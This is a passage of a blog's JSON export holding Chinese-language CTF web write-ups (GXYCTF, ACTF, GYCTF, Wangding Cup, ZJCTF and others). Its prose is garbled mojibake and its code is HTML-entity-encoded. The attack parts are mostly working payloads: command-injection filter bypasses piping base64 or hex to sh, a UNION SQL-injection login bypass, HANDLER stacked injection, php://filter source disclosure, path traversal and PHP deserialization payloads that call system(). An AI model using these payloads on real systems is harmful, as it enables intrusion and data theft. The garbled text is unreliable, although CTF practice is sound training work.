(strlen($_GET[&#x27;password&#x27;]) &lt; 8 &amp;&amp; $_GET[&#x27;password&#x27;] &gt; 9999999) &#123; if (strpos ($_GET[&#x27;password&#x27;], &#x27;-&#x27;) !== FALSE) //strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® &#123; die(&#x27;Flag: &#x27; . $flag); &#125; else &#123; echo(&#x27;have not been found&#x27;); &#125; &#125; else &#123; echo &#x27;Invalid password&#x27;; &#125;&#125;?&gt; è¦æ±‚è¾“å…¥passwordçš„é•¿åº¦å°äº8ä½ï¼Œä¸”å€¼è¦å¤§äº9999999ï¼Œå¹¶ä¸”éœ€è¦åŒ¹é…åˆ°-ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°ç§‘å­¦è®¡æ•°æ³•äº†ï¼š 1e10 = 10^10 ç”±äºè¿˜é™åˆ¶äº†è¾“å…¥å†…å®¹ï¼Œå› æ­¤è¿˜éœ€è¦è¿›è¡Œ%00æˆªæ–­ï¼Œæ„å»ºpayloadï¼š 1?password=1e10%00- æ€»ç»“ä»¥ä¸Šè¿™äº›ä¾¿æ˜¯å¸¸è§çš„phpå¼±ç±»å‹çš„ç»•è¿‡ï¼Œä»¥ä¸Šä»£ç æ¥æºå‡ä¸ºbugkuctf-ä»£ç å®¡è®¡æœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±å»å°è¯•ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"buuç»ƒä¹ ","slug":"buuç»ƒä¹ ","date":"2021-12-18T12:06:15.000Z","updated":"2022-01-01T08:26:07.843Z","comments":true,"path":"2021/12/18/buuç»ƒä¹ /","link":"","permalink":"http://example.com/2021/12/18/buu%E7%BB%83%E4%B9%A0/","excerpt":"å‰è¨€è€ƒå‰æ”¾æ¾å¿ƒæƒ…ï¼Œå°±å¤šåˆ·ç‚¹é¢˜ã€‚ä¹‹å‰å·²ç»æåˆ°äº†ä¸€äº›é¢˜ç›®äº†ï¼Œè¿™é‡Œå°±ä¸ä¼šé‡å¤äº†ã€‚","text":"å‰è¨€è€ƒå‰æ”¾æ¾å¿ƒæƒ…ï¼Œå°±å¤šåˆ·ç‚¹é¢˜ã€‚ä¹‹å‰å·²ç»æåˆ°äº†ä¸€äº›é¢˜ç›®äº†ï¼Œè¿™é‡Œå°±ä¸ä¼šé‡å¤äº†ã€‚ [GXYCTF2019]Ping Ping Pingé¡µé¢è¿›æ¥å°±æ˜¯å‘Šè¯‰æˆ‘ä»¬GETä¸€ä¸ªipå‚æ•°è¿›å»ï¼Œé‚£æˆ‘ä»¬è‡ªç„¶çŒœæƒ³è¿™é‡Œè¦ç”¨åˆ°å †å æ³¨å…¥ï¼Œæ„é€ payloadï¼š 12345?ip=1;lsPING 1 (0.0.0.1): 56 data bytesflag.phpindex.php å‘ç°flagæ–‡ä»¶ï¼Œç›´æ¥catè¯»å–ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œå†ç”¨æ‹¬å·å‘ç°ä¹Ÿè¢«è¿‡æ»¤ï¼Œçœ‹æ¥æ˜¯è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡‡ç”¨å…¶ä»–æ‰‹æ®µç»•è¿‡ï¼š $IFS ${IFS} $IFS$1 &lt; &lt;&gt; {cat,flag.php} %20 %09 å¦‚æœè¿™é‡Œcatè¢«è¿‡æ»¤äº†å¯ä»¥ç”¨tacä»£æ›¿ è¿™äº›æ˜¯å¸¸ç”¨çš„ç»•è¿‡ç©ºæ ¼æ‰‹æ®µï¼Œä½†æƒ³è¯»å–flagå‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œå¥½å®¶ä¼™ï¼Œé‚£æˆ‘ä»¬å…ˆè¯»å–index.phpæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819?phpif(isset($_GET[&#x27;ip&#x27;]))&#123; $ip = $_GET[&#x27;ip&#x27;]; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match))&#123; echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&quot;fxck your space!&quot;); &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123; die(&quot;fxck your bash!&quot;); &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123; die(&quot;fxck your flag!&quot;); &#125; $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&quot;; print_r($a);&#125;?&gt; æ³•ä¸€è™½ç„¶è¢«è¿‡æ»¤äº†å¾ˆå¤šä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°æœ‰ä¸ª$aå¯ä»¥ç»™æˆ‘ä»¬åˆ©ç”¨ï¼Œé‚£ä¹ˆè¿™é‡Œç¬¬ä¸€ç§è§£æ³•å°±æ˜¯è¿ç”¨å˜é‡æ›¿æ¢ï¼š 1?ip=1;a=g;cat$IFS$1fla$a.php æŸ¥çœ‹æºç æ‹¿åˆ°flagï¼š æ³•äºŒä¸éœ€è¦ä»€ä¹ˆèŠ±é‡Œèƒ¡å“¨çš„ï¼Œç›´æ¥å†…è”æ‰§è¡Œï¼š 1?ip=2;cat$IFS$1`ls` æ³•ä¸‰ç”¨ç®¡é“+shæ¥ç»•è¿‡è¢«è¿‡æ»¤çš„bashã€‚é¦–å…ˆå°†cat flag.phpå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œæ¥ç€è¿›è¡Œè¯»å–ï¼š 1?ip=3;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh è¿™å¼ å›¾æ€»ç»“äº†ä¸€äº›å¸¸ç”¨é€šé…ç¬¦ï¼š æ€»ä¹‹ï¼Œåœ¨åšç±»ä¼¼é¢˜ç›®æ—¶çš„å¤§è‡´è§£æ³•å¦‚ä¸‹ï¼š 1234567891011cat fl* ç”¨*åŒ¹é…ä»»æ„ ca\\t fla\\g.php åæ–œçº¿ç»•è¿‡cat fl&#x27;&#x27;ag.php ä¸¤ä¸ªå•å¼•å·ç»•è¿‡echo Y2F0IGZsYWcucGhw | base64 -d | bash(sh) //base64ç¼–ç ç»•è¿‡ ç®¡é“ç¬¦(|)ä¼šæŠŠå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„å‚æ•°echo 63617420666c61672e706870 | xxd -r -p | bash(sh) // hexç¼–ç ç»•è¿‡ï¼ŒåŸç†åŒä¸Šcat fl[a]g.php ç”¨[]åŒ¹é…a=fl;b=ag;cat $a$b å˜é‡æ›¿æ¢cp fla&#123;g.php,G&#125; æŠŠflag.phpå¤åˆ¶ä¸ºflaGca$&#123;21&#125;t a.txt åˆ©ç”¨ç©ºå˜é‡ ä½¿ç”¨$*å’Œ$@ï¼Œ$x(x ä»£è¡¨ 1-9),$&#123;x&#125;(x&gt;=10)(å°äº 10 ä¹Ÿæ˜¯å¯ä»¥çš„) å› ä¸ºåœ¨æ²¡æœ‰ä¼ å‚çš„æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„ç‰¹æ®Šå˜é‡éƒ½æ˜¯ä¸ºç©ºçš„ [ACTF2020 æ–°ç”Ÿèµ›]BackupFileè¿™é¢˜å…¶å®æŒºç®€å•çš„ï¼Œå†™ä¸‹æ¥ä¸»è¦æ˜¯ä¸ºäº†æé†’è‡ªå·±ï¼š æ‹¿åˆ°é¢˜è®°å¾—æ‰«ç›®å½• phpçš„==æ˜¯å¼±æ¯”è¾ƒï¼Œåœ¨æ¯”è¾ƒæ—¶å­—ç¬¦ä¸²å’Œæ•°å­—è¿›è¡Œæ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•°å­—å†è¿›è¡Œæ¯”è¾ƒ è¿™é¢˜çš„æºç ï¼š 1234567891011if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125; å› æ­¤ï¼Œè¿™é‡Œåªéœ€è¦è®©key=123å°±å¯ä»¥ç»•è¿‡äº†ã€‚ [GXYCTF2019]BabySQliè¿™é¢˜ä¹Ÿç®—æ˜¯æ¯”è¾ƒå¥‡ç‰¹çš„ä¸€é¢˜sqlå§ï¼Œè®°å½•ä¸€ä¸‹ã€‚ å‰ç«¯æ˜¯ç›¸å½“ç®€é™‹äº†ï¼Œæˆ‘ä»¬è¯•ç€æ³¨å…¥ä¸€ä¸‹ï¼Œå‘ç°åœ¨éªŒè¯çš„search.phpä¸‹æºç æœ‰ä¸€æ®µæ³¨é‡Šï¼Œè¿›è¡Œbase32ã€base64è§£å¯†åå¦‚ä¸‹ï¼š 1select * from user where username = &#x27;$name&#x27; è¯´æ˜æ³¨å…¥ç‚¹æ˜¯åœ¨usernameè¿™é‡Œæ²¡è·‘äº†ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œè¿™å…³è¿‡æ»¤äº†orã€()å’Œç­‰å·ï¼Œæ²¡äº†è¿™ä¸‰ä¸ªä¸œè¥¿ï¼Œå°¤å…¶æ˜¯å°æ‹¬å·åå¸¸è§„æ³¨å…¥æ€è·¯è‚¯å®šå°±ä¸è¡Œäº†ï¼Œå› æ­¤è¿™é¢˜å¿…é¡»å¾—ç»“åˆæºç å®¡è®¡ï¼š 12345678910111213141516171819202122232425262728293031323334mysqli_query($con,&#x27;SET NAMES UTF8&#x27;);$name = $_POST[&#x27;name&#x27;];$password = $_POST[&#x27;pw&#x27;];$t_pw = md5($password);$sql = &quot;select * from user where username = &#x27;&quot;.$name.&quot;&#x27;&quot;;// echo $sql;$result = mysqli_query($con, $sql);if(preg_match(&quot;/\\(|\\)|\\=|or/&quot;, $name))&#123; die(&quot;do not hack me!&quot;);&#125;else&#123; if (!$result) &#123; printf(&quot;Error: %s\\n&quot;, mysqli_error($con)); exit(); &#125; else&#123; // echo &#x27;&lt;pre&gt;&#x27;; $arr = mysqli_fetch_row($result); // print_r($arr); if($arr[1] == &quot;admin&quot;)&#123; if(md5($password) == $arr[2])&#123; echo $flag; &#125; else&#123; die(&quot;wrong pass!&quot;); &#125; &#125; else&#123; die(&quot;wrong user!&quot;); &#125; &#125;&#125; æˆ‘ä»¬å‘ç°ï¼Œåç«¯æ¥æ”¶åˆ°è´¦å·å¯†ç åï¼Œç›´æ¥å°†è´¦å·ä½œä¸ºæŸ¥è¯¢æ¡ä»¶æŸ¥è¯¢ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„ç»“æœç¬¬äºŒé¡¹å¿…é¡»ä¸ºadminï¼Œç¬¬ä¸‰é¡¹å¿…é¡»ä¸ºåŸå¯†ç md5åçš„å¯†ç ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è”åˆæŸ¥è¯¢çš„ç‰¹æ€§ï¼Œå…ˆæŸ¥è¯¢1è¿™ä¸ªåŸæœ¬ä¸å­˜åœ¨çš„ä¸€è¡Œï¼Œæ¥ç€å¤šå‡ºä¸€æ®µè”åˆæŸ¥è¯¢å­—æ®µä½œä¸ºä¸´æ—¶æ•°æ®æ’å…¥ã€‚ å› æ­¤ï¼Œæ„å»ºpayloadï¼š 1name=mrl64&#x27;union select 1,&#x27;admin&#x27;,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#&amp;pw=1 [GYCTF2020]Blacklistå…¸å‹çš„å †å æ³¨å…¥ï¼Œç›´æ¥ä¸€è·¯showè¯­å¥æŸ¥è¯¢åˆ°åˆ—ï¼š 12341&#x27;;show databases;# //æŸ¥åº“1&#x27;;show tables from supersqli;# //æŸ¥è¡¨1&#x27;;show columns from FlagHere;# //æŸ¥åˆ—1&#x27;;select flag from FlagHere;# //æŸ¥æ•°æ® å‘ç°åˆ—åflagï¼Œä½†æ˜¯å½“æˆ‘å‡†å¤‡æŸ¥è¯¢æ—¶ï¼Œå‘ç°selectè¢«è¿‡æ»¤äº†ï¼š ä¸€ç‰‡éƒ½è¢«è¿‡æ»¤äº†ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨åˆ°äº†handlerï¼š 123456789101112131415161718192021222324// æ‰“å¼€ä¸€ä¸ªè¡¨åä¸º tbl_name çš„è¡¨çš„å¥æŸ„HANDLER tbl_name OPEN [ [AS] alias]1ã€é€šè¿‡æŒ‡å®šç´¢å¼•æŸ¥çœ‹è¡¨ï¼Œå¯ä»¥æŒ‡å®šä»ç´¢å¼•é‚£ä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡ NEXT ç»§ç»­æµè§ˆHANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]2ã€é€šè¿‡ç´¢å¼•æŸ¥çœ‹è¡¨FIRST: è·å–ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰NEXT: è·å–ä¸‹ä¸€è¡ŒPREV: è·å–ä¸Šä¸€è¡ŒLAST: è·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ]3ã€ä¸é€šè¿‡ç´¢å¼•æŸ¥çœ‹è¡¨READ FIRST: è·å–å¥æŸ„çš„ç¬¬ä¸€è¡ŒREAD NEXT: ä¾æ¬¡è·å–å…¶ä»–è¡Œï¼ˆå½“ç„¶ä¹Ÿå¯ä»¥åœ¨è·å–å¥æŸ„åç›´æ¥ä½¿ç”¨è·å–ç¬¬ä¸€è¡Œï¼‰æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ READ NEXT ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœ HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ]//å…³é—­å·²æ‰“å¼€çš„å¥æŸ„HANDLER tbl_name CLOSE ç”±äºè¿™é‡Œæˆ‘ä»¬çŸ¥é“flagåœ¨ç¬¬ä¸€åˆ—ï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š 1?inject=1&#x27;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;# [BSidesCF 2020]Had a bad dayå‘ç°ç‚¹å‡»WOOFERSæˆ–è€…MEOWERSåï¼ŒURLå‡ºç°äº†categoryå‚æ•°ï¼Œæƒ³åˆ°åˆ©ç”¨ä¼ªåè®®è¯»å–æºç ï¼š 1?category=php://filter/convert.base64-encode/resource=index å¦‚æœè¯»å–index.phpå¤±è´¥çš„è¯å¯ä»¥å°è¯•è¯»å–indexï¼Œè¿™é¢˜å°±æ˜¯è¿™æ ·çš„ã€‚ base64è§£ç è·å¾—çš„æºç (phpéƒ¨åˆ†)ï¼š 12345678910111213&lt;?php $file = $_GET[&#x27;category&#x27;]; if(isset($file)) &#123; if( strpos( $file, &quot;woofers&quot; ) !== false || strpos( $file, &quot;meowers&quot; ) !== false || strpos( $file, &quot;index&quot;))&#123; include ($file . &#x27;.php&#x27;); &#125; else&#123; echo &quot;Sorry, we currently only support woofers and meowers.&quot;; &#125; &#125;?&gt; å‘ç°è¿™é¢˜è¦æ±‚å‚æ•°ä¸­è¦æœ‰woofersã€meowersã€indexæ‰å¯ä»¥è¿è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆå°è¯•ç›´æ¥è¯»å–ï¼š 1?category=woofers/../flag å‘ç°æŸ¥çœ‹å™¨ä¸­å‡ºç°äº†æ–°å†…å®¹ï¼Œè¯´æ˜åŒ…å«flag.phpæˆåŠŸï¼Œä½†æ˜¯éœ€è¦è¿›ä¸€æ­¥è¯»å–ã€‚å› æ­¤æˆ‘ä»¬åˆ©ç”¨php://filterä¼ªåè®®å¯ä»¥å¥—ä¸€å±‚åè®®çš„ç‰¹æ€§æ„å»ºpayloadï¼š 1?category=php://filter/convert.base64-encode/index/resource=flag åŒæ ·å¦‚æœflag.phpä¸è¡Œæ—¶å¯ä»¥ç”¨flagæˆ–è€…flag.txtè¿›è¡Œå°è¯•ï¼Œè¿™é¢˜æ˜¯flag è¯»å–åˆ°æ–°çš„base64ç ï¼Œè§£ç å°±å¯ä»¥å¾—åˆ°flagï¼š [NPUCTF2020]ReadlezPHPæŸ¥çœ‹å‰ç«¯ä»£ç å‘ç°æœ‰æ–‡ä»¶time.php/?sourceï¼Œè¿›å…¥å‘ç°ååºåˆ—åŒ–ä»£ç ï¼š 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); HelloPhpç±»å‹å¯åŠ¨æ—¶å°†Y-m-d h:i:sèµ‹å€¼ç»™$aï¼Œå°†dateèµ‹å€¼ç»™$bï¼Œä¹‹åç»“æŸç±»å‹æ—¶æ‰§è¡Œecho $b($a)ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œå°±æ˜¯æ‰§è¡Œecho date(Y-M-D h:i:s)ã€‚ é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ€§è´¨ï¼Œæ„é€ assert(phpinfo())ã€‚assert()ä¸eval()ç±»ä¼¼ï¼Œè¿™ä¸¤è€…çš„åŒºåˆ«æ˜¯ï¼Œå‰è€…ä¼šæŠŠæ•´ä¸ªå­—ç¬¦ä¸²å‚æ•°å½“åšphpä»£ç æ‰§è¡Œï¼Œè€Œåè€…åªä¼šæŠŠåˆæ³•çš„phpä»£ç æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬æ„å»ºpayloadï¼š 1234567891011121314151617181920&lt;?phpclass HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;phpinfo()&quot;; $this-&gt;b = &quot;assert&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp; echo serialize($c);?&gt;?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; æœ€ååœ¨phpinfoä¸­æŸ¥æ‰¾flagå³å¯ï¼š [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialzå¼€é—¨è§ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $op = &quot;1&quot;; $filename = &quot;/tmp/tmpfile&quot;; $content = &quot;Hello World!&quot;; $this-&gt;process(); &#125; public function process() &#123; if($this-&gt;op == &quot;1&quot;) &#123; $this-&gt;write(); &#125; else if($this-&gt;op == &quot;2&quot;) &#123; $res = $this-&gt;read(); $this-&gt;output($res); &#125; else &#123; $this-&gt;output(&quot;Bad Hacker!&quot;); &#125; &#125; private function write() &#123; if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123; if(strlen((string)$this-&gt;content) &gt; 100) &#123; $this-&gt;output(&quot;Too long!&quot;); die(); &#125; $res = file_put_contents($this-&gt;filename, $this-&gt;content); if($res) $this-&gt;output(&quot;Successful!&quot;); else $this-&gt;output(&quot;Failed!&quot;); &#125; else &#123; $this-&gt;output(&quot;Failed!&quot;); &#125; &#125; private function read() &#123; $res = &quot;&quot;; if(isset($this-&gt;filename)) &#123; $res = file_get_contents($this-&gt;filename); &#125; return $res; &#125; private function output($s) &#123; echo &quot;[Result]: &lt;br&gt;&quot;; echo $s; &#125; function __destruct() &#123; if($this-&gt;op === &quot;2&quot;) $this-&gt;op = &quot;1&quot;; $this-&gt;content = &quot;&quot;; $this-&gt;process(); &#125;&#125;function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123; $str = (string)$_GET[&#x27;str&#x27;]; if(is_valid($str)) &#123; $obj = unserialize($str); &#125;&#125; å®¡è®¡å®Œæ¯•åæˆ‘ä»¬å‘ç°æœ‰ä¸¤ä¸ªåœ°æ–¹éœ€è¦ç»•è¿‡ï¼š is_valid()ä¼šåˆ¤æ–­å­—ç¬¦ä¸­æ˜¯å¦å­˜åœ¨ä¸å¯æ‰“å°å­—ç¬¦ï¼Œå¦‚æœä¸å­˜åœ¨æ‰ä¼šè¿”å›trueï¼Œè€Œprotectedå±æ€§çš„å˜é‡åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶ä¼šäº§ç”Ÿä¸å¯æ‰“å°å­—ç¬¦ï¼Œå› æ­¤è¿™é‡Œå°†å˜é‡å±æ€§è®¾ç½®ä¸ºpublicå³å¯ åªæœ‰å½“opçš„å€¼ä¸º2æ—¶æ‰ä¼šè½¬åˆ°read()ä¸­æ‰§è¡Œfile_get_contents($this-&gt;filename)ä»£ç ï¼Œä½†æ˜¯åœ¨__destruct()ä¸­å¦‚æœæ£€æµ‹åˆ°opå¼ºç±»å‹ç­‰äº2çš„è¯å°†ä¼šè½¬åŒ–ä¸º1ï¼Œè¿™é‡Œæ¶‰åŠåˆ°çš„æ˜¯å¼ºå¼±ç±»å‹çš„æ¯”è¾ƒï¼Œå°†opè®¾å®šä¸ºæ•´æ•°2å°±å¯ä»¥ç»•è¿‡ï¼š1234567891011&lt;?phpclass FileHandler &#123; public $op = 2; public $filename = &quot;flag.php&quot;; public $content;&#125;$a=new FileHandler;echo serialize($a);?&gt;?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; æŸ¥çœ‹æºç å³å¯è·å–flagï¼š [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpwebå‰ç«¯ä¸€ç›´åœ¨åˆ·æ–°ï¼Œæˆ‘ä»¬æŠ“åŒ…è¯•è¯•ï¼Œå‘ç°POSTå†…å®¹ï¼š 1func=date&amp;p=Y-m-d+h%3Ai%3As+a é€šè¿‡è¿™ä¸ªæˆ‘ä»¬çŒœæµ‹åç«¯ä»£ç ç±»ä¼¼äºæ˜¯è¿™æ ·çš„ï¼š 1assert($func(&amp;p)) ä½†æ˜¯æˆ‘ä»¬å¸¸ä½¿ç”¨system()å†™å…¥å‘½ä»¤æ—¶ï¼Œå‘ç°è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬é¦–å…ˆè¯»å–æºç ï¼š 1func=file_get_contents&amp;p=index.php æºç ï¼š 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; ä½¿ç”¨çš„æ˜¯call_user_func()ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰å¤ªå¤§å·®åˆ«ã€‚æˆ‘ä»¬å‘ç°åç«¯å¯¹funcè¿›è¡Œäº†ä¸¥æ ¼è¿‡æ»¤ï¼Œä½†æ˜¯pæ²¡æœ‰ï¼Œå¹¶ä¸”å­˜åœ¨classå®šä¹‰ç±»å‹ï¼Œé‚£ä¹ˆå°±ä¸éš¾æƒ³åˆ°æ„å»ºååºåˆ—åŒ–ï¼š 12345678910&lt;?phpclass Test &#123; var $p = &quot;find / -name flag*&quot;; var $func = &quot;system&quot;;&#125;$a=new Test;echo serialize($a);?&gt;func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:18:&quot;find / -name flag*&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; æ‰¾åˆ°flagä½ç½®ï¼Œç»§ç»­æ„å»ºï¼š 12345678910&lt;?phpclass Test &#123; var $p = &quot;cat /tmp/flagoefiu4r93&quot;; var $func = &quot;system&quot;;&#125;$a=new Test;echo serialize($a);?&gt;func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:22:&quot;cat /tmp/flagoefiu4r93&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125; [ZJCTF 2019]NiZhuanSiWeiè¿™é¢˜è¿ç”¨åˆ°äº†phpä¼ªåè®®å’Œååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹ï¼Œè§£é¢˜è¿‡ç¨‹ä¹Ÿæ˜¯æ¯”è¾ƒå·§å¦™åœ°ã€‚é¦–å…ˆæ˜¯æºç ï¼š 12345678910111213141516171819 &lt;?php $text = $_GET[&quot;text&quot;];$file = $_GET[&quot;file&quot;];$password = $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#x27;r&#x27;)===&quot;welcome to the zjctf&quot;))&#123; echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#x27;r&#x27;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file))&#123; echo &quot;Not now!&quot;; exit(); &#125;else&#123; include($file); //useless.php $password = unserialize($password); echo $password; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; æ ¹æ®æºç ï¼Œè¿™é¢˜æˆ‘ä»¬åº”è¯¥è¦ä¼ ä¸‰ä¸ªå‚æ•°ï¼Œé¦–å…ˆæ˜¯textå‚æ•°ï¼Œæˆ‘ä»¬è¦å°†welcome to the zjctfå†™å…¥æ–‡ä»¶ä¸­ï¼Œé‚£ä¸éš¾æƒ³åˆ°è¿™é‡Œè¿ç”¨äº†dataä¼ªåè®®è¿›è¡Œå†™å…¥ï¼š 1text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= è·³è½¬åˆ°æ–°çš„é¡µé¢ï¼Œæ¥ä¸‹æ¥æ˜¯fileå‚æ•°ï¼Œå‘ç°å®¡è®¡æºç è¿™é‡Œæœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œä¸”æç¤ºä¸€ä¸ªuseless.phpï¼Œæˆ‘ä»¬å°è¯•ç›´æ¥åŒ…å«å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œé‚£åŒæ ·è¿™é‡Œåˆ©ç”¨php://filterä¼ªåè®®è¿›è¡Œè¯»å–ï¼š 1file=php://filter/read=convert.base64-encode/resource=useless.php å¾—åˆ°base64ç ï¼Œè§£ç åå¾—åˆ°åˆä¸€æ®µæºç ï¼š 12345678910111213&lt;?php class Flag&#123; //flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); &#125; &#125; &#125; ?&gt; 